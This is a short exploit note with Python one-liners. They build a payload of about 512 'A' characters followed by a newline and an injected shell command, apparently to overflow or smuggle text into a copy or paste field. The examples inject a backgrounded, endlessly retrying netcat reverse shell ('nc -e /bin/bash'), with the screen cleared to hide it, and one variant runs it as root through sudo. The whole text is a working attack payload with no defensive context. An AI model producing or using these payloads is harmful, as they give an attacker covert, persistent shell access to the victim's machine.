
create payload:<b>
python2 -c \'print \"A\"*511+\"command here\"\' 


example:


#with current user:
python2 -c 'print "copy from[" +"A"*512+"\nbash -c \"while true;do nc -e /bin/bash 127.0.0.1 2021 2>/dev/null;done &clear\""+"\n ]to"'

#with root? user:
python2 -c 'print "copy from[" +"A"*512+"\nsudo -u root bash -c \"while true;do nc -e /bin/bash 127.0.0.1 2021 2>/dev/null;done &clear\""+"\n ]to"'
